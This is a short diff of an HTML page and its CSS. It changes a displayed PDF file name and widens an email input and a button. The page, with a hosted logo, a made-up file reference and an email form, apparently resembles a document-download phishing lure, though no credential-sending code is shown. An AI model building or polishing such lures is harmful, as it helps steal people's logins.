@@ -25,7 +25,7 @@
         <div class="content">
           <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
           
-          <p style="font-size: 17px;  color: #333333;">FileRef-FAC65478_2025.pdf</p>
+          <p style="font-size: 17px;  color: #333333;">FAC654378_06_2025.pdf</p>
          
 
           <div class="form-wrapper">
@@ -250,7 +250,7 @@ body {
 }
 
 .email-input {
-  width: 82%;
+  width: 85%;
   padding: 0.5rem;
   border: 0.9px solid #444;
   border-radius: 5px;
@@ -274,7 +274,7 @@ body {
   border-radius: 5px;
   cursor: pointer;
   font-size: 1rem;
-  width: 87%;
+  width: 90%;
   transition: background-color 0.2s ease;
 }
 
